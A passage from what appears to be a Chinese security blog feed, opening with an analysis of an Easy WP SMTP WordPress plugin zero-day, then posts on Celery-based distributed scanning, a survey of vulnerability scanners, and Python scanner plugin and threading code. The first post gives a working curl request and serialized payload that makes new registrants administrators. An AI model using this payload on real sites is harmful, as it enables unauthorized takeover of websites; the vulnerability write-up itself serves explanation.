下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。</p>

<p>关键函数位置在：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
</code></pre>
</div>
<p>这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。</p>

<p>然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
</code></pre>
</div>

<p>我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：</p>

<p>网上给出的poc：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

</code></pre>
</div>

<p>网上的poc是利用函数中的一个导入配置文件的功能：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
</code></pre>
</div>
<p>在导入以后，他会对文件内容进行一个反序列化解析：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$in = unserialize( $in_raw );
</code></pre>
</div>
<p>我们可以使用下面的array:</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="err">[</span><span class="nt">"users_can_register"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(1)</span><span class="w"> </span><span class="nt">"1"</span><span class="w">
  </span><span class="err">[</span><span class="nt">"default_role"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(13)</span><span class="w"> </span><span class="nt">"administrator"</span><span class="w">
</span><span class="err">}</span><span class="w">
</span></code></pre>
</div>
<p>序列化以后成为：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}"
</code></pre>
</div>
<p>再次组合array：</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="err">[</span><span class="nt">"data"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(81)</span><span class="w"> </span><span class="nt">"a:2:{s:18:"</span><span class="err">users_can_register</span><span class="nt">";s:1:"</span><span class="err">1</span><span class="nt">";s:12:"</span><span class="err">default_role</span><span class="nt">";s:13:"</span><span class="err">administrator</span><span class="nt">";}"</span><span class="w">
  </span><span class="err">[</span><span class="nt">"checksum"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(32)</span><span class="w"> </span><span class="nt">"3ce5fb6d7b1dbd6252f4b5b3526650c8"</span><span class="w">
</span><span class="err">}</span><span class="w">

</span></code></pre>
</div>
<p>第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}
</code></pre>
</div>

<p>简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
</code></pre>
</div>
<p>我们可以看到，需要绕过两个部分：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>unserialize( $in_raw );
unserialize( $in['data'] )
</code></pre>
</div>
<p>经过两次反序列化的结果后，data的内容，也就是下面的数组：</p>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="err">[</span><span class="nt">"users_can_register"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(1)</span><span class="w"> </span><span class="nt">"1"</span><span class="w">
  </span><span class="err">[</span><span class="nt">"default_role"</span><span class="err">]=&gt;</span><span class="w">
  </span><span class="err">string(13)</span><span class="w"> </span><span class="nt">"administrator"</span><span class="w">
</span><span class="err">}</span><span class="w">
</span></code></pre>
</div>
<p>才能分拆为key-value，进入后续函数：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>foreach ( $data as $key =&gt; $value ) 
{
	    update_option( $key, $value );
}
</code></pre>
</div>

<p>users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…</p>

<p>下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>/wp-includes/option.php::update_option
</code></pre>
</div>
<p>我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$value = apply_filters( "pre_update_option_{$option}", $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb-&gt;update( $wpdb-&gt;options, $update_args, array( 'option_name' =&gt; $option ) );
</code></pre>
</div>
<p>附上数据库wp_options表查询的最初始的默认结果：
<img src="http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg" alt="" /></p>

<p>本文可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。</p>

<p>引用文章：</p>

<p><a href="https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/">Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.</a></p>
]]></content>
      <categories>
        
          <category> bug </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[分布式扫描填坑杂谈]]></title>
      <url>/scanner/2019/01/15/talk-about-scanner-settings/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</strong></span>
</p>

<p>在本文中，将简单谈谈我这边采用的技术栈，有关对分布式填坑的经历，大家注意这里依旧是采用的python code。</p>

<ul>
  <li>celery库版本</li>
</ul>

<p>以root权限启动root的问题，低版本不识别，会报错，这里使用的是celery==3.1.2x。</p>
<div class="highlighter-rouge"><pre class="highlight"><code>from celery import Celery, platforms
platforms.C_FORCE_ROOT = True

</code></pre>
</div>

<ul>
  <li>redis库版本</li>
</ul>

<p>版本不合适，或者worker和server版本不对等的话，可能出现celery worker 开启不久就offline的问题，或者redis会不时的掉线重连。</p>

<p>这里把redis库的版本，从原来的redis==3.0.x降级到redis==2.10.x，基本解决了上述bug。</p>

<p>需要注意的是，在celery高版本的时候（比如4.x），可能会需要匹配3.x的redis库，大家看情况而定。</p>

<ul>
  <li>重连机制</li>
</ul>

<p>我们这里在后端存储结果，考虑到复杂sql交叉调用，还是采用的关系数据库mysql。</p>

<p>局域网中数据库写入，需要考虑重连机制，常用的如MySQLdb库，原生无重连机制，需要自己重写。</p>

<p>这里推荐两个模块，都支持重连：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>torndb
facebook开源的一个基于MySQLdb二次封装的一个mysql模块。
pymysql
比较常用，需要python3。
</code></pre>
</div>

<ul>
  <li>加强存取稳定性</li>
</ul>

<p>如果想要加强局域网数据存取的稳定性，除了把上述的超时和重连配置好以外，暂时有两个办法：</p>

<blockquote>
  <p>第一：可以将存入局域网数据库服务器失败的数据，暂存本地关系数据库。采用定时调度器，或者监控网络空闲时，再进行同步
。</p>
</blockquote>

<blockquote>
  <p>第二：可以将命令或者数据直接写入本地中间件，当监控到网络空闲时间，自动同步。</p>
</blockquote>

<p>另外，笔者这方面经验比较浅，欢迎运维大佬和coding大佬多多指教下这一块儿有没有其他可优化的点。</p>

<ul>
  <li>局域网调试</li>
</ul>

<p>检测网络状态，可以看出ping其他worker是通的：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; app = Celery('test', backend='redis://random_host:6379/0', broker='redis://random_host:6379/0')
&gt;&gt;&gt; app.control.ping(timeout=0.5)

[{'worker1.example.com': 'pong'},
</code></pre>
</div>

<p>查看时区差异:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; from celery.utils.timeutils import utcoffset
&gt;&gt;&gt; utcoffset()

0
</code></pre>
</div>
<p>库版本不同步等原因，可能造成worker和server的时间不同步。而且时间不同步，似乎会导致celery的超时机制不可用。</p>

<p>我们可以安装ntp服务，自动更新时间，同步server和worker的指定python库版本，示例命令如下【每个系统情况不一定适用】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install ntp
service ntp start
#手动更新时间
date -R

</code></pre>
</div>

<p>监控woker状态的一些点，可以参考这篇文章：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://fangchichen.github.io/fangchichen.github.io/2018/08/08/celery%E5%87%BA%E7%8E%B0worker%E5%BC%82%E5%B8%B8offline%E6%83%85%E5%86%B5/
</code></pre>
</div>

<ul>
  <li>celery关键配置</li>
</ul>

<p>还是那句话，各系统情况不同，
这里仅仅贴出几个关键点,大家觉得可以优化的地方可以讨论下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#任务预取功能，就是每个工作的进程／线程在获取任务的时候，会尽量多拿 n 个，以保证获取的通讯成本可以压缩。
CELERYD_PREFETCH_MULTIPLIER = 1

#这个表示每个工作的进程／线程 在执行 n 次任务后，主动销毁，之后会起一个新的，主要解决一些资源释放的问题。
CELERYD_MAX_TASKS_PER_CHILD = 1

#不存取返回结果，加快响应速度。
CELERY_IGNORE_RESULT=False

#该配置可以保证task不丢失，中断的task在下次启动时将会重新执行。
TASK_REJECT_ON_WORKER_LOST = True
#不会多拿任务，只有当worker完成了这个task时，任务才被标记为ack状态。
#只有当worker完成了这个task时，任务才被标记为ack状态
CELERY_ACKS_LATE = True

#解决时区同步问题
CELERY_TIMEZONE = 'Asia/Shanghai'
CELERY_ENABLE_UTC = True
USE_TZ = True

#broker的连接超时时间。
BROKER_CONNECTION_TIMEOUT = 20

#如果确认是因为当前worker的并发是prefork（多进程）,并且可能是由于死锁原因造成，4.0之后的版本不支持。
CELERYD_FORCE = True

#任务超时会分配给其他worker
BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 3600}

#禁用所有速度限制，如果网络资源有限，不建议开足马力。
#CELERY_DISABLE_RATE_LIMITS = True
#CELERY_ACKS_LATE = True
#CELERY_IGNORE_RESULT = True

#这个表示保存任务结果的时长，这个时间会被设置到 backend 里面
#CELERY_TASK_RESULT_EXPIRES = 3600

</code></pre>
</div>

<ul>
  <li>celery命令行参数</li>
</ul>

<p>Queue还是建议启用的，方便清空，也方便指定queuename运行特定任务。
比如配置文件里这么写:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>CELERY_QUEUES = (
            Queue('default', Exchange('default'), routing_key='default'),
            Queue('wakaka', Exchange('wakaka'), routing_key='wakaka'),
            )
</code></pre>
</div>

<p>那么，命令行可以这么输入：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>celery -A test worker -E -l INFO -n workername -Q wakaka --concurrency=4
</code></pre>
</div>

<p>注意，–concurrency的值是并发进程数，这是由你的CPU个数决定性能的，不要设太高。</p>

<p>win下的话，在高版本celery 4.x，默认的是prefork，报错解决方法如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>pip install eventlet
celery -A proj worker -l info -P eventlet

</code></pre>
</div>

<p>最后，建议大家不要在win下运行celery，似乎4.x以后某个版本已经放弃支持，而且win下有很多坑没法填。</p>

<ul>
  <li>任务调度框架</li>
</ul>

<p>关于任务调度这一块儿，除了celery，感觉dramatiq和rq的坑会少些，以后会抽空来谈谈。</p>

<h3 id="结语">结语</h3>

<p>以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[漫谈漏洞扫描]]></title>
      <url>/scanner/2018/12/27/talk-about-scanner-roads/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</strong></span>
</p>

<h3 id="企业级漏扫">企业级漏扫</h3>

<ul>
  <li>盒子扫描器</li>
</ul>

<p>对于漏扫产品的话，部分甲方单位会按公安那边的标准，在内网部署一些盒子扫描器（硬件服务器+扫描软件）。</p>

<p>说实话，这玩意儿定位是比较尴尬的，虽然大的单位每年有一定的采购指标。但是有时候还是会听产品经理吐槽，每次实在卖不出量，可能一单安全服务生意卖出个一两台就不错了。</p>

<p>当然，现在漏扫一般会配合漏洞管理、网站监控等产品一起卖。为了覆（tong）盖（hang）产（jing）品（zheng）线，给售前和销售操控的空间，这款产品还是必须要的。</p>

<p>卖漏扫盒子的利润还算可观，只要销售和渠道给力，传统乙方还是愿意做的这门生意的。</p>

<p>代表厂商有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>sangfor
venus
nsfocus
topsec
...
</code></pre>
</div>

<ul>
  <li>在线漏扫服务</li>
</ul>

<p>在线漏扫的话，一般难以对内网进行检测。大多数的操作是，在验证外网某站的所有权后，再签协议授权扫描。不过由于成本较盒子更加低廉，容易受到中小厂商的追捧。</p>

<p>当然，如果内网也需要享受这样的服务的话，自然还是需要安服人员带着盒子，或者类似封装好的扫描器，在企业单位进行驻场检测。</p>

<p>代表厂商有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>360
knownsec
...
</code></pre>
</div>
<ul>
  <li>定制漏扫</li>
</ul>

<p>据笔者所知，部分云服务厂商，会对云服务客户提供了定制漏扫服务。</p>

<p>由于是自家的服务器，自然对客户的业务具有一定的了解。无论是做漏扫，还是做资产监控还是态势感知，都是相对容易的。</p>

<p>云服务厂商在对这部分客户做漏扫时，由于统一的架构部署，安服漏扫会比较精确和有效。貌似这样的漏扫服务，一般不会对外开放，算是定制的服务。</p>

<p>顺便提一句，部分漏洞平台，好像对于大客户也推出了一条龙服务，其中是包括定制漏扫的。</p>

<p>代表云厂商有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>alibaba
tencent
kingsoft
riskivy
...
</code></pre>
</div>

<ul>
  <li>免费商业漏扫</li>
</ul>

<p>市面上也出现了部分优秀的商业级别漏扫，咱们这里先别讨论是免费版还是破解版。</p>

<p>正是有了这些漏扫产品，在驻场和分公司的苦逼兼职的安服人员，才有了一口饭吃【纯吐槽公司制度】。</p>

<p>这里解释下，因为公司内部的漏扫产品，不是分驻地都能拿到授权的，那最后怎么办呢？用破解的。效果不好咋办？换其他家的破解或者免费产品。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>AWVS
nessus
arachni
metasploit
sqlmap
burpsuite
appscan
netsparker
...
</code></pre>
</div>

<h3 id="开源漏扫">开源漏扫</h3>

<ul>
  <li>社区级漏扫</li>
</ul>

<p>这些产品一般是社区或者团队在维护的，一般为乙方渗透人员或者Bug Bounty人员所用。</p>

<p>一旦他们需要对企业机构，或者政府单位进行渗透测试时，可以根据情况，部署分布式节点扫描，加快漏扫速度。</p>

<p>笔者依稀记得曾经的bugscan，好像大家都可以接入公网节点。这听起来，其实有点像以前的迅雷p2p，可以加速所有运行的任务。</p>

<p>不过后来好像由于各种原因，部分人搞到了源码和payload包，自己玩起了单机。多台外网VPS一部署，扫起东西来也是美滋滋，亲测出结果还是比较快的。</p>

<p>不过这种漏扫有个坏处就是，一旦社区不用心再维护，渐渐就没有人再提交payload，毕竟单个漏洞的生命周期还是不长的。</p>

<p>当然，这种产品还有个去路，就是实现企业化。</p>

<p>一旦变成企业级产品，就会有更多的资源投入去维护它，自然能更好的发展下去。</p>

<p>比较可惜的是，升级后的版本以及payload，自然大多数就不会再开源了。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>bugscan
蚁逅
tangscan
Beebeeto
Pocscan
Osprey「鱼鹰」
...
</code></pre>
</div>

<ul>
  <li>综合扫描</li>
</ul>

<p>由于各种脚本语言的兴起，大幅减少了coding的难度和时间，网络上涌现出一批由团队或个人维护的综合扫描器。</p>

<p>虽然得吐槽下，大多数质量良莠不齐，造轮子的比较多，而且后续长期作者维护的比较少，不过其中不乏优秀的个体。</p>

<p>综合扫描定义比较模糊，一般除了exp检测和CMS识别外，还有部分项目加入了路径爆破、资产统计、端口扫描等功能。</p>

<p>不过让人稍稍有点失望的是，这类综合扫描可能大同小异，暂时没有发现特别亮眼的点。</p>

<p>在笔者过往的系列文章中，也谈过部分关于综合扫描器细节，这里不再细说。</p>

<p>代表产品有:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>w9scan
AngelSword
fenghuangscanner
猪猪侠PPT中提过的扫描器
...
</code></pre>
</div>

<ul>
  <li>Gui扫描</li>
</ul>

<p>这里之所以单独区别于前面的综合扫描器【其实是笔者实在想不出小标题了XD】，是想谈谈其开发时间、开发难度，以及插件化难度。</p>

<p>虽然说部分Gui扫描器也实现了插件化，但作者们大多喜欢自己更新，或者只要求邮件方式提交插件。</p>

<p>这样的话，把产品生态搞成了一个近似闭环，但是肯定又远不及apple store之类的体量，导致用户主动提交的漏扫插件是比较少的。</p>

<p>当然，有部分漏扫的功能和用户体验，还是做的很不错的，很受大家追捧，笔者当年也用的很顺手。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>椰树
北极熊扫描器
k8 team系列扫描器
千手千眼佛网站扫描器
...
</code></pre>
</div>

<ul>
  <li>代理扫描器</li>
</ul>

<p>说起代理扫描器，可能内容就比较宽泛了，这里简单讲下，以后有机会单独谈谈。</p>

<p>何谓代理，中间人也，只要你能抓住中间流量，便可以作为基准去做漏洞扫描或者fuzz。</p>

<p>大家可能会想到利用抓包，利用网卡流量进行分析；有人也许会通过浏览器流量代理进行分析；还有人会通过浏览器本身提供扩展插件功能，直接对页面进行即时钩子探测。</p>

<p>说到这块儿，笔者所见的一般都是轻量级的，也可能是见识少吧。个人感觉很少有在采集存数据库以后，在离线端部署过多的exp探测任务的。</p>

<p>毕竟，这块儿也是要考虑到扫描效率，以及会话过期问题的。</p>

<p>另外，貌似代理扫描器对owasp的一些通用漏洞的fuzz，以及对敏感内容的检测，会显得多一些。对于能检测逻辑漏洞的被动扫描器，也算是比较高level的了。</p>

<p>代表产品有：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ysrc的GourdScan
burpsuite插件系列
wyproxy的衍生扫描器
浏览器插件系列
...
</code></pre>
</div>

<h3 id="结语">结语</h3>

<p>笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。</p>

<p>可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈漏扫之插件篇]]></title>
      <url>/scanner/2018/10/08/scanner-plugins/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</strong></span>
</p>

<p>在本文中，我们将简单谈谈插件相关的内容。下面的示例代码依旧沿用python，但求行文精炼不赘言。</p>

<h3 id="插件的格式">插件的格式</h3>

<ul>
  <li>入口函数</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>def run():
    print 'I am the bone of my sword'
</code></pre>
</div>
<p>运行这类插件时，加载插件的入口函数run，就可以直接运行插件。</p>

<ul>
  <li>类 + 入口函数</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>class BaseVerify:

    def __init__(self, url):
        self.url = url
    
    def run(self):
        print 'I am the bone of my sword'
</code></pre>
</div>

<p>对于这种插件，在我们获取到漏洞库文件路径后，需要对服务类型进行匹配，最后再进行插件调用。
此后，我们会获得BaseVerify类的实例，再引用里面的入口函数。</p>

<p>调用方式：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>test = BaseVerify('http://www.baidu.com')
test.run()
</code></pre>
</div>

<ul>
  <li>入口函数 + 验证函数</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>def assign(service, arg):
    if service != "wordpress":
        return
    else:
        r = urlparse.urlparse(arg)
        return True, r.netloc
        
def audit(arg):
    print 'I am the bone of my sword'
        
</code></pre>
</div>
<p>这里也可以在类中引入函数，不过此处关键点在于，同时也使用了验证函数。</p>

<p>这样做的好处在于，即使不做插件目录分类，也能进行精准扫描，不至于在验证漏洞时处耗时过多。</p>

<p>不过顺便提一句，即使只运行了验证service类型的代码，在加载大量插件的情况下，也是会消耗一定的资源的。</p>

<p>调用方式(仅做参考)：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>try:
    audit( assign('www', 'http://www.baidu.com')[1] )
except:
    pass
</code></pre>
</div>

<ul>
  <li>关于插件注释</li>
</ul>

<p>在每个文件中，建议通过类属性或者直接头部注释，对每个插件进行细节标识。
不然的话，他人在复现和修改的时候，很难对代码量较大的内容进行阅读调整。当然，对于某些故意加密的插件，那就另当别论了。</p>

<h3 id="插件的加载">插件的加载</h3>

<ul>
  <li>__import__</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>plugin_path = 'plugin_dir.plugin_name'
try:
    plugin = __import__(plugin_path, fromlist=[plugin_path])
    test = getattr(plugin,'audit')
    test('http://www.baidu.com')
except Exception,e:
    print e

</code></pre>
</div>
<p>这里在获取某个插件的路径后，可转换为__import__可识别的路径格式，然后再对其入口函数audit进行引用。</p>

<ul>
  <li>importlib</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>
from importlib import import_module
plugin_path = 'plugin_dir.plugin_name'
split_dot = plugin_path.rindex('.')
module, name = plugin_path[:split_dot], plugin_path[split_dot+1:]
mod = import_module(module)
try:
    test = getattr(mod, name)
    test.audit('http://www.baidu.com')
except:
    pass

</code></pre>
</div>
<p>注意，这里的plugin_path如果不含’.’的话，可用：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from importlib import import_module
plugin_path = 'plugin_name'
test = import_module(plugin_path)
test.audit('http://www.baidu.com')

</code></pre>
</div>

<ul>
  <li>import</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>import sys
sys.path.append('plugin_dir/')
#加入系统路径plugin_dir
import plugin_name
plugin_name.audit('http://www.baidu.com')
</code></pre>
</div>

<ul>
  <li>imp</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>import imp
#这里需要正常路径名
test = imp.load_source('audit', 'plugin_dir/plugin_name.py')
test.audit('http://www.baidu.com')

</code></pre>
</div>

<ul>
  <li>导入细节的讨论</li>
</ul>

<p>笔者还见过某框架，除了导入必要的核心库文件以外，还把所有分类插件里的验证、运行等函数，也在主文件头部一股脑导入的。</p>

<p>也就是说，在每次运行框架之前，就算只是-v看版本，也会预载入所有内容。</p>

<p>而在某些框架脚本，在每次运行前会自动下载一个巨大的封装库（作者diy的），而不是把它放在requirement文件里。</p>

<p>也不是说这样一定不好，不过个人窃以为，如果想要尽可能优化框架的效率，还是不太推荐大家这么做。</p>

<h3 id="插件的存储">插件的存储</h3>

<ul>
  <li>临时加载</li>
</ul>

<p>在插件不算多的时候，我们是可以这么做的，也不会太影响效率。
比如metasploit就可以选择是否启用postgresql数据库。
如果插件都放在一个目录下，进行文件遍历即可，大概可以这样写：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>vuln_dir = 'plugin_dir/*'
vuln_paths = [f.replace('/','.') for f in glob.glob(vuln_dir)]
for vuln_path in vuln_paths:
    #vuln_path == 'plugin_dir.plugin_name'
    #下面省略
    ...
    ...
</code></pre>
</div>

<ul>
  <li>离线插件入库</li>
</ul>

<p>另外还有不少框架，是直接用数据库或者json文件存储了插件相关信息。在我们需要的时候，再查询导入储存的插件路径，进而对相应的插件进行调用。</p>

<p>当然，这样需要我们每次手动或调用update脚本，去现更新这些库。</p>

<ul>
  <li>在线核验下发</li>
</ul>

<p>如果想要再自动化一点，我们可以参考下bugscan、antoor、tangscan等社区级别的漏洞利用框架，对于插件下发的法子。</p>

<p>在贡献者上传poc，并填写好相关验证信息后，后台会有工作人员或者自动化脚本，检测该poc是否合乎官方规定的语法格式。
如果没有发现问题，脚本会生成基础信息然后入库，待做好加密打码等工作后【非必要步骤】，再供离线的框架或者框架client节点爬取更新【如有出入，当我扯淡】。</p>

<h3 id="结果的聚合">结果的聚合</h3>

<ul>
  <li>分级过滤</li>
</ul>

<p>一般在汇总数据报告时，可能会出现有的确认是漏洞，有的却是存在的敏感URL。</p>

<p>混在一起存储也不是不行，不过更好的法子是通过分级，使用单独的函数上报master，最后再进行分储和输出。</p>

<ul>
  <li>混合存储</li>
</ul>

<p>在整合网上搜集来的插件时，由于各结果的返回格式不是很好统一，有的整合型框架为了兼容会直接简单处理下，就糅合在一起存储和输出了。
其实这也没啥，只要入库的时候，将特殊字符等问题处理好，做好插件漏洞的信息粗放分类标注，那就基本OK了。</p>

<ul>
  <li>单体输出</li>
</ul>

<p>某些作者单独开发的框架，是直接省略了存储这一环节的，或者是提供了选项，默认不开启的。
这时候，插件验证如果成功，会直接把信息反馈输出到命令行里。如果在验证单体漏洞或者单个目标的时候，这样做还是比较有效率的。</p>

<h3 id="结语">结语</h3>

<p>上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。</p>
]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈漏扫之加速篇]]></title>
      <url>/scanner/2018/09/03/scanner-faster/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。</strong></span>
</p>

<p>为了方便描述，笔者这里会拿python的库来举例，部分代码采集自网络。本文会向大家简要评析一些能加快扫描速率的库。希望借此帮大家规避掉一些坑，很多点也是具有普适性的。</p>

<h3 id="线程">线程</h3>

<h4 id="多线程">多线程</h4>

<p>示例：</p>

<ul>
  <li>threading</li>
</ul>

<p>用法比较简单，普通速成小脚本建议用这个库，比如在扫描主机存活或者探测URL路径是否存在的时候。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#coding:utf-8
import threading
import time

def action(arg):
    time.sleep(1)
    print  'sub thread start!the thread name is:%s    ' % threading.currentThread().getName()
    print 'the arg is:%s   ' %arg
    time.sleep(1)


for i in xrange(4):
    t =threading.Thread(target=action,args=(i,))
    t.setDaemon(True)
    t.start()
    t.join()

print 'main_thread end!'
</code></pre>
</div>

<ul>
  <li>thread</li>
</ul>

<p>有的朋友可能会问，有没有更简单的，老夫不懂那么多，只想一把梭！
当然有，很早以前笔者也曾喜欢使用这个库：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#coding=gbk
import thread, time, random
count = 0
def threadTest():
    global count
    for i in xrange(10000):
        count += 1
for i in range(10):
    thread.start_new_thread(threadTest, ())	
time.sleep(3)
print count	
</code></pre>
</div>

<p>不过thread.start_new_thread有个比较明显的缺点，因为起了新线程是不好控制的，一旦任务挂起过多，会占用较多的机器资源，所以建议在检测目标量不大的时候使用。</p>

<h4 id="线程池">线程池</h4>

<ul>
  <li>threadpool</li>
</ul>

<p>说实在这库还是比较好用的，在无序输出结果等情况下比较稳健，尤其是它在win平台下兼容性是比较好的。
不过需要注意，就是如果不加锁的话，需要先做数据聚合。直接按序写入文件，或者直接入库的话，数据会乱掉。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>import time
import threadpool  
def sayhello(str):
    print "Hello ",str
    time.sleep(2)

name_list =['xiaozi','aa','bb','cc']
start_time = time.time()
pool = threadpool.ThreadPool(10) 
requests = threadpool.makeRequests(sayhello, name_list) 
[pool.putRequest(req) for req in requests] 
pool.wait() 
print '%d second'% (time.time()-start_time)
</code></pre>
</div>

<ul>
  <li>concurrent.futures</li>
</ul>

<p>该库是python 3.x自带的，但python 2.x也能用，相对来说会比threadpool更优化的多一些，毕竟新库嘛。</p>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="c"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">sayhello</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"hello: "</span><span class="o">+</span><span class="n">a</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

